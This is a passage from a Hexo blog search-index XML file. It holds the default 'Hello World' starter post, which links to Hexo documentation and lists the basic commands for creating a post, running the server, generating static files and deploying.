      <title>Hello World</title>
      <link href="/2019/12/11/hello-world/"/>
      <url>/2019/12/11/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
